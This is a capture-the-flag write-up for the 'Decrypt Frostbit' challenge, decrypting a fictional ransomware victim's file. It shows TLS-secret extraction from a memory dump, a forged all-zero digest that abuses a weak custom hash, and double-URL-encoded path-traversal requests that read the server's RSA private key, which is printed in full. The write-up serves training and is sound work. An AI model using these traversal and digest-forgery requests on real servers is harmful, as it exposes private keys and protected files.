<div style="text-align: center; font-size: 2em; font-weight: bold; color: black; margin-bottom: 20px;">
    Decrypt Frostbit - Tangle Coalbox
</div>

Tangle Coalbox needs our help to deal with the Frostbit Ransomware. This is what he tell us when we speak to him:

![Tangle Coalbox Conversation 1](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Tangle Coalbox-1.png)
![Tangle Coalbox Conversation 2](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Tangle Coalbox-2.png)

Dusty Giftwrap had provided us with some hints after completing Snowball Showdown in Act 2:

##Hint 1 - Frostbit Hashing

The Frostbit infrastructure might be using a reverse proxy, which may resolve certain URL encoding patterns before forwarding requests to the backend application. A reverse proxy may reject requests it considers invalid. You may need to employ creative methods to ensure the request is properly forwarded to the backend. There could be a way to exploit the cryptographic library by crafting a specific request using relative paths, encoding to pass bytes and using known values retrieved from other forensic artifacts. If successful, this could be the key to tricking the Frostbit infrastructure into revealing a secret necessary to decrypt files encrypted by Frostbit.

##Hint 2 - Frostbit Dev Mode

There's a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn't disable dev mode, we might be able to pass extra options to reveal more information. If they are reusing our code or hardware, it might also be broadcasting MQTT messages.

##Hint 3 - Frostbit Crypto

The Frostbit ransomware appears to use multiple encryption methods. Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI. The infrastructure may also be using custom cryptography to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with known vulnerabilities. There may be a way to have the infrastructure reveal the cryptographic library in use.

##Hint 4 - Frostbit Forensics

I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It's great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes.

##Access to the Challenge - Environment set up

**Note**: Decrypt Frostbit and Deactivate Frostbit use the same generated environment. If you want to start with Deactivate first, you still need to do the below set up first.

When clicking on the terminal, a message with the following text is presented to us:

<div style="text-align: center; background-color: black; padding: 20px; border-radius: 10px; color: white;">
  <p style="color: #00ff00; font-size: 1.5em; font-weight: bold;">
    North Pole Cyber Security Department
  </p>
	  <p style="color: #d3d3d3; font-size: 1.2em;">
    Frostbit Ransomware Incident
  </p>
  <p style="color: #87CEFA; font-size: 1.1em;">
    The <strong>Naughty-Nice list</strong> has been encrypted by the Frostbit ransomware.
  </p>
  <p style="color: #87CEFA; font-size: 1.1em;">
    Click the button below to download the forensic artifacts collected by the North Pole Cyber Security Department from the compromised computer. Use these artifacts to help decrypt the <strong>Naughty-Nice list</strong> and prevent its publication by the ransomware server.
  </p>
</div>

Clicking on the "Generate & Download Artifacts" button will produce the required artifacts. However, it's important to note:

* If you click "Generate & Download Artifacts" again at any point, you may need to redo some steps.
* Certain data is exclusive to the artifacts generated during a specific session.

![Generating Artifacts](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-1.png)

Once the artifact generation is completed, a download will start and we will get a file called frostbitartifacts.zip. Inside the zip file, we have the following files:

* DoNotAlterOrDeleteMe.frostbit.json
* naughty_nice_list.csv.frostbit
* ransomware_traffic.pcap
* frostbit.elf
* frostbit_core_dump.13

#**Solution**

![Decrypt Frostbit Objective](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-2.png)

The naughty_nice_list.csv.frostbit appears to be an encrypted file, so our final target will be to unencrypt that file.

The hint suggests to use 'strings' on a memory dump, so I began by running that command against frostbit_core_dump.13. I carefully reviewed the output, copying all interesting strings into my notes for further examination. To organize the data, I categorized the strings into different types of information, mainly:

* TLS keys
* messages with digest data
* API queries and URLs
* Any other random data

One of the initial observations was the presence of TLS keys. I compiled all related strings into a file, removed duplicates and incomplete entries, and ended up with the following data:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
SERVER_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 c9af7db1b3afd5da3b5e6b702966dd74a31f9711417c0f45f0ca83e17b50819f
SERVER_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 cb57d4449fbd947abe10c19a29fd65c22720e6690f0a26d87b830f7382c18d44
CLIENT_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 b11d81e40c6039861fed820d46eac83e8876314780bf85418376a5d4a55ad8d4
CLIENT_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 694a63cb7d0a558bff58be6c922d88f16bcdb09b27fd6a29e132e48243e9e716
</pre>

The above looks like TLS secrets. In particular, they are used for the following:

* The `CLIENT_HANDSHAKE_TRAFFIC_SECRET` and `SERVER_HANDSHAKE_TRAFFIC_SECRET` are used for handshake decryption.
* The `CLIENT_TRAFFIC_SECRET_0` and `SERVER_TRAFFIC_SECRET_0` allow decryption of application-layer traffic (e.g., HTTP).

Where could we use that information? Well, we have a pcap file, so it looks like a good place to explore. I opened the pcap and inside there was encrypted TLS traffic. To attempt to unencrypt it with the information gathered from the memory dump, I created a file called tls-secrets.txt with the following content:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
CLIENT_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 694a63cb7d0a558bff58be6c922d88f16bcdb09b27fd6a29e132e48243e9e716
SERVER_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 cb57d4449fbd947abe10c19a29fd65c22720e6690f0a26d87b830f7382c18d44
CLIENT_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 b11d81e40c6039861fed820d46eac83e8876314780bf85418376a5d4a55ad8d4
SERVER_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 c9af7db1b3afd5da3b5e6b702966dd74a31f9711417c0f45f0ca83e17b50819f
</pre>

Then, I loaded it into wireshark as follow:

`Edit > Preferences > Protocols > TLS > load the file at Pre-Master Secret log filename.`

After reloading the pcap I could see the traffic unencrypted:

![Decrypted pcap](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-3.png)

So, in summary, we can see the following requests and server replies:

```
GET /api/v1/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/session HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Sat, 28 Dec 2024 10:44:50 GMT
Content-Type: application/json
Content-Length: 29
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"nonce":"a899f16565491df4"}
```
```
POST /api/v1/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/key HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Content-Length: 1070
Content-Type: application/json
Accept-Encoding: gzip

{"encryptedkey":"1f431a1614b6d4c6ae0081276934e1a9e8b5426e048eb5a57f80c21e3fb4453c283ca31d2854b2071fef019d1cb1c444d4bf0f4982ea780531ec86163747b31bc2f5a8c2f08fda8211466b1493af279bac4fd5357d8e316cbbd6e5eaf31b382598dfeef14ec1e0ee6ab3c7da1a635ea39e1e16998f250498440f0c751bc40a3dd7fb268778ad46ac337ec1fc59de6e35c107953524479b76aca264e56e4d6d5057d3b552314eae0461445cda615ea8acccc68f0cf75bf089253deb6313325dc008f4549d564965907a87b2a3e1099792bfe49a566dda8a8e7278f73a32c4345ab2f8f99caf4bc51acfd7c47d2e18aa59c3654b59960f7e1fd9cdf88cd1fd9b7ccacc539d1c23d58e1bc9bdc008aa6711a0c3db4d8e965d89125f0d3b92f743caed7266d304a8bdb49f6298ab67e4cbbbeef583e41f81f311aba208e755b038eab3dff0a441ffc469c7501592667924b7cb0048e5186c04547ef47d28f61eb970609c88bc9122144ba5f9f20ec55e0fd6c84b57ac662155f9743902222e3f653def2a715ea33232271c8dde8d82809e98c7e6b87c0924e60394fe35e7c299bff7898ddf1c9de3e667bc1e3b1423cb48e01c7f1931aec88327b0f64c34c66ef301bccbb6396ba0efd0c1786ea590803739e80ed880e72930810a7b352cf537ab8896d5c105837cfae32045811f80c50cabd6b5eac4eff08968ce7437705d476f45","nonce":"a899f16565491df4"}

HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Sat, 28 Dec 2024 10:44:50 GMT
Content-Type: application/json
Content-Length: 97
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"digest":"e088821207024982f18ea85c03200203","status":"Key Set","statusid":"j2tvSGY8fhG7RkD1Sw"}
```
The most important value from that pcap is the nonce: **a899f16565491df4**.

Both the pcap file and the memory dump contain references to the following URL:  https://api.frostbit.app

Navigating to the base URL returns a 404. However, we can try specific URLs extracted from the pcap and the memory dump. After checking all the URLs, one stood out as the most interesting:

https://api.frostbit.app/view/j2tvSGY8fhG7RkD1Sw/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203

Accessing the URL shows a ransom note from Wombley:

![Ransom note](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-4.png)


The next step was to explore the website. While inspecting the HTML, I noticed the following code snippet towards the bottom:
```html
        <!-- Placeholder for Debug Data -->
        <div id="debug" style="margin-top: 20px;"></div>
```
Recalling the hint from the elf about dev mode, I tried adding debug=true to the URL. This successfully enabled debug mode: 

https://api.frostbit.app/view/j2tvSGY8fhG7RkD1Sw/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true

This is the data we get from debug mode:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
{"uuid": "917c8ddd-fc69-421e-8134-aa92c78e42f0", "nonce": "REDACTED", "encryptedkey": "REDACTED", "deactivated": false,  "etime": 1766534400}
</pre>

As a next step, I started playing with the parameters available in the URL. Eventually, I started changing values for the digest value. I tried to simply remove one character from the digest parameter and I got an error:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
{"debug":true,"error":"Status Id File Digest Validation Error: Traceback (most recent call last):\n File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"}
</pre>

That led me to discover a python script with a hashing function:

https://api.frostbit.app/static/FrostBiteHashlib.py

There's a few rabbit holes I followed from here, and initially, I did not know how to use that python code for my advantage so I parked it and continue checking the website using the debug mode.

Eventually, I started playing with the status ID parameter in the URL. In my case, I was accessing the site using the following URL:

https://api.frostbit.app/view/j2tvSGY8fhG7RkD1Sw/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true

So my status ID was `j2tvSGY8fhG7RkD1Sw`. 

When changing something in that parameter, I got the following error:
```
{"debug":true,"error":"Status Id File Not Found"}
```
That error suggests that `j2tvSGY8fhG7RkD1Sw` is actually a file name. I started attempting Local File Inclusion (LFI) attacks against the parameter. But alas, my initial attempts were a sad parade of failure. Then two critical pieces of information came into play:

* I noticed in the source code the following URL: `/static/frostbit.png`. Even though it is an uninteresting file, it provided a known resource that could confirm whether an LFI vulnerability was present.
* The hint from the elf: *“The Frostbit infrastructure might be using a reverse proxy, which may resolve certain URL encoding patterns”*. This made me realize I had not attempted yet to double URL encode my attempts.

Combining these insights, I pieced together the following request to test the hypothesis:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
GET /view/%252e%252e%252fstatic%252ffrostbit.png/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true HTTP/2
</pre>

Success! We get a different error now, suggesting that we can indeed access the file:
```json
{"debug":true,"error":"Invalid Status Id or Digest"}
```
However, that's still an error so I cannot access the file yet. The message mentions the digest. Remembering the python file, I realized that the digest was used to validate the file being accessed. Now with more context, I looked again at the python file:

```python
import traceback
import binascii

class Frostbyte128:
    def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16):
        self.file_bytes = file_bytes
        self.filename_bytes = filename_bytes
        self.filename_bytes_length = len(self.filename_bytes)
        self.nonce_bytes = nonce_bytes
        self.nonce_bytes_length = len(self.nonce_bytes)
        self.hash_length = hash_length
        self.hash_result = self._compute_hash()

    def _compute_hash(self) -> bytes:
        hash_result = bytearray(self.hash_length)
        count = 0

        for i in range(len(self.file_bytes)):
            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
            count += 1

        for i in range(len(self.filename_bytes)):
            count_mod = count % self.hash_length
            count_filename_mod = count % self.filename_bytes_length
            count_nonce_mod = count % self.nonce_bytes_length
            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
            hash_result[count_mod] = hash_result[count_mod] & xrd
            count += 1

        return bytes(hash_result)

    def digest(self) -> bytes:
        """Returns the raw binary hash result."""
        return self.hash_result

    def hexdigest(self) -> str:
        """Returns the hash result as a hexadecimal string."""
        return binascii.hexlify(self.hash_result).decode()

    def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None):
        """Updates the internal state with new bytes and recomputes the hash."""
        if file_bytes is not None:
            self.file_bytes = file_bytes
        if filename_bytes is not None:
            self.filename_bytes = filename_bytes
        if nonce_bytes is not None:
            self.nonce_bytes = nonce_bytes

        self.hash_result = self._compute_hash()

    def validate(self, hex_string: str):
        """Validates if the provided hex string matches the computed hash."""
        try:
            decoded_bytes = binascii.unhexlify(hex_string)
            if decoded_bytes == self.digest():
                return True, None
        except Exception as e:
            stack_trace = traceback.format_exc()
            return False, f"{stack_trace}"
        return False, None
```

The code seems to compute the hash by performing an XOR operation with the file contents and the nonce. After that, it XORs the filename and the nonce and the result does an AND with the result of the first XOR.

To better understand and experiment with this process, I created a Python script that interacts with the `Frostbyte128` class, allowing me to test different values and potentially identify any weaknesses in the way the hash is calculated. Here's the code I developed:

```python
#!/usr/bin/env python

import sys
import os
import binascii
from FrostBiteHashlib import Frostbyte128

input_file = sys.argv[1]
input_filename = sys.argv[2]
input_nonce = sys.argv[3]

print("Arguments received:", sys.argv)

with open(input_file, 'rb') as file:
    file_data = file.read()

filename_bytes = binascii.unhexlify(input_filename)
nonce_bytes = binascii.unhexlify(input_nonce)

# Compute the hash using Frostbyte128
frostbyte_hash = Frostbyte128(file_data, filename_bytes, nonce_bytes)

# Output the resulting hash
print(frostbyte_hash.hexdigest())
```

I started noticing that in certain cases, specially with filenames with all 'F' and '0', I could find collisions. For example:

```
python3 hash-calculator.py test.txt 0FFFFF0FFFFFFFFFFFFF a899f16565491df4
Arguments received: ['hash-calculator.py', 'test.txt', '0FFFFF0FFFFFFFFFFFFF', 'a899f16565491df4']
510406020a1210091051331a6f32009b
```
```
python3 hash-calculator.py test.txt 0FFFFF0FFFFFFFF0000F a899f16565491df4
Arguments received: ['hash-calculator.py', 'test.txt', '0FFFFF0FFFFFFFF0000F', 'a899f16565491df4']
510406020a1210091051331a6f32009b
```

Comparing next to each other:
```
510406020a1210091051331a6f32009b
510406020a1210091051331a6f32009b
```
This prompted me to look to the algorithm again in detail and I noticed something interesting: 

The second loop performs an XOR of the filename and the nonce. Since we know the nonce, if we set nonce=filename, the result of the XOR operation should yield all zeros. This is due to the fact that any value XORed with itself results in zero. Next, the algorithm performs an AND operation between the result of this XOR and the the first loop's XOR, which involves the file contents. Since one of the operands in the AND operation is all 0s, the final result of the AND operation will also be all zeros.

I tested my theory:
```
python3 hash-calculator.py test.txt a899f16565491df4 a899f16565491df4
Arguments received: ['hash-calculator.py', 'test.txt', 'a899f16565491df4', 'a899f16565491df4']
000000000000591d1051331a6f320000
```
Hmmmm, not the all-zeros result I expected. Wait! Of course! the hash length is 16 bytes! Since our nonce is 8 bytes, we need to use it twice:
```
python3 hash-calculator.py test.txt a899f16565491df4a899f16565491df4 a899f16565491df4
Arguments received: ['hash-calculator.py', 'test.txt', 'a899f16565491df4a899f16565491df4', 'a899f16565491df4']
00000000000000000000000000000000
```
Success! I had figured out how to control the hash result. For this trick to work, I need the filename value to be equal to the nonce, twice in this case to cover the 16 bytes.

The next task was to figure out how to send a filename that matched the nonce twice while still gaining access to my target file. From my the Santa Vision, we know that our ultimate target is to get access to `/etc/nginx/certs/api.frostbit.app.key`. We can use the vulnerability to find the file:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
GET /view/%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true HTTP/2
</pre>

The answer from the server confirms that's the right path! Key located.

To speed up my testing, I created a handy cheatsheet for URL double encoding:

```
% = %2525
/ = %252f
../ = %252e%252e%252f
./ = %252e%252f
/. = %252f%252e
// = %252f%252f
/./ = %252f%252e%252f
```

After some trial and error, I hit upon a breakthrough. I made the following request:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
GET /view/%252e%252e%252frandom%252f%252e%252e%252fstatic%252ffrostbit.png/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true HTTP/2
</pre>

The above sends the following query: `../random/../static/frostbit.png/` and the server responded with:
```
{"debug":true,"error":"Invalid Status Id or Digest"}
```
At this point, it became clear that the backend was resolving paths, essentially running something similar to this:
```
os.path.realpath('random/../../../../../etc/passwd')
'/home/kali/etc/passwd'
```
That returns the canonical path of a specified file or directory, so relative paths will be resolved and removed.

As usual, let's test the theory and add the nonce at the beginning of the path to access our known file:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
GET /view/a899f16565491df4a899f16565491df4%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=00000000000000000000000000000000&debug=true HTTP/2
</pre>
```
{"debug":true,"error":"Invalid Status Id or Digest"}
```
This was frustrating! I was pretty sure that should have worked. This challenge is full of additional traps and small steps... Checking my hash-calculator.py script, I realized something important: I was handling the correct formats myself so that the right values were passed to FrostBiteHashlib. I need to send the data as hex (and of course, double encoded to bypass the proxy)! So the nonce value should be:

`a899f16565491df4`<br>
The format is hex so:<br>
`%a8%99%f1%65%65%49%1d%f4`<br>
Then double encoding it:<br>
`%25a8%2599%25f1%2565%2565%2549%251d%25f4`

And now twice:

`%25a8%2599%25f1%2565%2565%2549%251d%25f4%25a8%2599%25f1%2565%2565%2549%251d%25f4`

Let's try:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
GET /view/%25a8%2599%25f1%2565%2565%2549%251d%25f4%25a8%2599%25f1%2565%2565%2549%251d%25f4%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=00000000000000000000000000000000&debug=true HTTP/2
</pre>

FINALLY! Many hours later, this provides the answer we were looking for, and we get the contents of the key file:

![RSA Key](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-5.png)


The entire file is below:

```

	    -----BEGIN RSA PRIVATE KEY-----
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
		-----END RSA PRIVATE KEY-----
```
				
From the pcap and the memory dump, we had the following encrypted key:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
{"encryptedkey":"1f431a1614b6d4c6ae0081276934e1a9e8b5426e048eb5a57f80c21e3fb4453c283ca31d2854b2071fef019d1cb1c444d4bf0f4982ea780531ec86163747b31bc2f5a8c2f08fda8211466b1493af279bac4fd5357d8e316cbbd6e5eaf31b382598dfeef14ec1e0ee6ab3c7da1a635ea39e1e16998f250498440f0c751bc40a3dd7fb268778ad46ac337ec1fc59de6e35c107953524479b76aca264e56e4d6d5057d3b552314eae0461445cda615ea8acccc68f0cf75bf089253deb6313325dc008f4549d564965907a87b2a3e1099792bfe49a566dda8a8e7278f73a32c4345ab2f8f99caf4bc51acfd7c47d2e18aa59c3654b59960f7e1fd9cdf88cd1fd9b7ccacc539d1c23d58e1bc9bdc008aa6711a0c3db4d8e965d89125f0d3b92f743caed7266d304a8bdb49f6298ab67e4cbbbeef583e41f81f311aba208e755b038eab3dff0a441ffc469c7501592667924b7cb0048e5186c04547ef47d28f61eb970609c88bc9122144ba5f9f20ec55e0fd6c84b57ac662155f9743902222e3f653def2a715ea33232271c8dde8d82809e98c7e6b87c0924e60394fe35e7c299bff7898ddf1c9de3e667bc1e3b1423cb48e01c7f1931aec88327b0f64c34c66ef301bccbb6396ba0efd0c1786ea590803739e80ed880e72930810a7b352cf537ab8896d5c105837cfae32045811f80c50cabd6b5eac4eff08968ce7437705d476f45","nonce":"a899f16565491df4"}
</pre>

Using the RSA key, we can decrypt the key with openssl:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
echo "1f431a1614b6d4c6ae0081276934e1a9e8b5426e048eb5a57f80c21e3fb4453c283ca31d2854b2071fef019d1cb1c444d4bf0f4982ea780531ec86163747b31bc2f5a8c2f08fda8211466b1493af279bac4fd5357d8e316cbbd6e5eaf31b382598dfeef14ec1e0ee6ab3c7da1a635ea39e1e16998f250498440f0c751bc40a3dd7fb268778ad46ac337ec1fc59de6e35c107953524479b76aca264e56e4d6d5057d3b552314eae0461445cda615ea8acccc68f0cf75bf089253deb6313325dc008f4549d564965907a87b2a3e1099792bfe49a566dda8a8e7278f73a32c4345ab2f8f99caf4bc51acfd7c47d2e18aa59c3654b59960f7e1fd9cdf88cd1fd9b7ccacc539d1c23d58e1bc9bdc008aa6711a0c3db4d8e965d89125f0d3b92f743caed7266d304a8bdb49f6298ab67e4cbbbeef583e41f81f311aba208e755b038eab3dff0a441ffc469c7501592667924b7cb0048e5186c04547ef47d28f61eb970609c88bc9122144ba5f9f20ec55e0fd6c84b57ac662155f9743902222e3f653def2a715ea33232271c8dde8d82809e98c7e6b87c0924e60394fe35e7c299bff7898ddf1c9de3e667bc1e3b1423cb48e01c7f1931aec88327b0f64c34c66ef301bccbb6396ba0efd0c1786ea590803739e80ed880e72930810a7b352cf537ab8896d5c105837cfae32045811f80c50cabd6b5eac4eff08968ce7437705d476f45" | xxd -r -p | openssl rsautl -decrypt -inkey api.frostbit.app.key
</pre>

```
14ab53643d6f1da969ad7fb8df4fdd63,a899f16565491df4 
```
The puzzles in this challenge just keep coming... Now it appears that `14ab53643d6f1da969ad7fb8df4fdd63` may be the decryption key, while `a899f16565491df4`, which, by the way, is our nonce, the IV. We need to use this key and IV to decrypt the naughty nice list. The above key is 16 bytes, so likely AES-128 was used. The main question left is what mode was used. I went to CyberChef and started experimenting with various options. It didn’t take long to figure it out, as I correctly guessed that CBC was the mode used. And voilà, decryption was successful.

![Naughty Nice list decrypted](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-6.png)

The settings used were:

Key (UTF8): `14ab53643d6f1da969ad7fb8df4fdd63`<br>
IV (UTF8): `a899f16565491df4`<br>
Mode: CBC<br>
Input: Raw
